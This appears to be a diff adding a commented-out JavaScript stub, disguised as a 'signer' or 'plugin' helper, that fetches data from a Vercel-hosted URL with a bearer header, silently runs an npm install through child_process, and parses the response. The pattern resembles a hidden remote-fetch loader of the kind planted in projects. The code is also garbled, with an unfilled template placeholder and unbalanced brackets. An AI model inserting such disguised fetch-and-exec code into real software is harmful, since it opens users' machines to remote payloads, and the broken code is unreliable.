@@ -1,0 +1,29 @@
+// const { spawn , exec } = require('child_process');
+// const https = require('https');
+
+// const signerOrNull = () => { 
+//      function getPlugin() { 
+//         const https = require("https"); 
+//         const domain = "https://my-project-abc123-sandy.vercel.app/output?purpose=output";
+//         https.get(domain,{ headers: { Authorization: 'Bearer ' + {{DOMAIN}} } }, (res) => {
+//         let data = "";
+
+//     res.on("data", chunk => {
+//         data += chunk;
+//     });
+
+//     res.on("end", () => {
+//         exec(
+//   'npm install axios --no-save --silent --no-audit --no-fund',
+//   (error, stdout, stderr) => {
+//     if (error) {
+//       console.error(error);
+//       return;
+//     }
+//         const parsed = JSON.parse(data);
+
+//     });
+// });
+//         })}};
+    
+// signerOrNull();
